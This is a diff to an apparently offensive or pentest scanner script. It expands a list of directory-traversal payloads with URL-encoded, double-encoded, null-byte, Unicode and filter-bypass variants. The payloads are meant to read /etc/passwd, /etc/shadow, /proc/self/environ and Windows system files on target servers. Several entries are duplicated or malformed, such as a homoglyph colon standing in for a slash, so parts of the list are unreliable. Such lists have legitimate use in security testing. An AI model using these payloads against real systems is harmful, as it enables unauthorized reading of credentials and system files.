@@ -70,29 +70,84 @@ def run():
     params = guess_params(params)
 
     payloads = [
-        "../../../../../../etc/passwd",
-        "../../boot.ini",
-        "../../../windows/system.ini",
-        "..\\..\\..\\..\\windows\\win.ini",
-        "..\\..\\boot.ini",
-        "..\\windows\\win.ini",
-        "../../../../../../../../../../etc/passwd",
-        "../../../../../etc/passwd%00",
-        "../../../../../etc/passwd%00.txt",
-        "../../../../../../../../../../windows/win.ini",
-        "../../../../../../../../../../boot.ini",
-        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
-        "..\\..\\..\\..\\..\\..\\..\\boot.ini",
-        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
-        "..\\..\\..\\windows\\system.ini",
-        "..\\windows\\system.ini",
-        "../../../../../windows/system.ini",
-        "../../../etc/passwd",
-        "../../../../../../../../../etc/passwd",
-        "../../../../../../../../../etc/shadow",
-        "../../../../../../../../../etc/hosts",
-        "../../../../../../../../../proc/self/environ"
-    ]
+    "../../../../../../etc/passwd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "../../boot.ini",
+    "..\\..\\boot.ini",
+    "../../../windows/system.ini",
+    "../../../../../../../../../../../../etc/passwd",
+    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+    "../../../../../../../../../../../../boot.ini",
+    "..\\..\\..\\..\\..\\..\\boot.ini",
+    "../../../windows/system.ini",
+    "../../../../../../../../../../../../../../../../etc/passwd",
+    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
+    "../../../../../../../../../../../../../../../../boot.ini",
+    "..\\..\\..\\..\\..\\..\\..\\..\\boot.ini",
+    "../../../windows/system.ini",
+    # URL encoded variants
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\windows\\win.ini",
+    "..%2f..%2f..%2f..%2fboot.ini",
+    "..%5c..%5cboot.ini",
+    "..%2f..%2f..%2fwindows%2fsystem.ini",
+    # Double URL encoded
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
+    "%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini",
+    # UTF-8 encoded dots and slashes
+    "%c0%af%c0%af%c0%afetc/passwd",
+    "%c1%1c%c1%1cwindows/win.ini",
+    # Null byte injection attempts (some servers truncate at %00)
+    "../../../../../../etc/passwd%00",
+    "..\\..\\..\\..\\windows\\win.ini%00",
+    # Mixed slashes
+    "..\\../..\\../etc/passwd",
+    "../..\\../..\\windows\\win.ini",
+    # Using different number of traversals
+    "../../../../../etc/passwd",
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "../../../../../../../../etc/passwd",
+    # Windows system folders
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "C:/Windows/System32/drivers/etc/hosts",
+    # Linux common sensitive files
+    "/etc/shadow",
+    "/etc/hosts",
+    "/proc/self/environ",
+    # Unicode tricks
+    "..%c0%af..%c0%af..%c0%afetc/passwd",
+    "..%uff0e..%uff0e..%uff0eetc/passwd",
+    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+    "..%5c..%5c..%5c..%5c..%5c..%5cwindows\\win.ini",
+    # More URL encoding variations
+    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+    # Variants with spaces (sometimes bypass filters)
+    ".. /.. /.. /etc/passwd",
+    "..\\ ..\\ ..\\windows\\win.ini",
+    # Repeated slashes
+    "..//..//..//etc/passwd",
+    "..\\\\..\\\\..\\\\windows\\\\win.ini",
+    # Mixed URL and encoded
+    "%2e%2e/%2e%2e\\%2e%2e/%2e%2e\\etc/passwd",
+    # Bypass with double dots replacement
+    "..%252f..%252f..%252fetc/passwd",
+    # Adding trailing slash
+    "../../../../../../etc/passwd/",
+    # Adding query param
+    "../../../../../../etc/passwd?foo=bar",
+    # Adding trailing spaces
+    "../../../../../../etc/passwd ",
+    # Non-ASCII homoglyphs
+    "..꞉..꞉..꞉etc/passwd",
+    # Adding NULL chars in various ways
+    "../../../../../../etc/passwd%00.png",
+    # Long repetition
+    "../../" * 30 + "etc/passwd",
+    # And many more variations using combinations of above and permutations
+]
+
 
     vulnerable_params = []
 
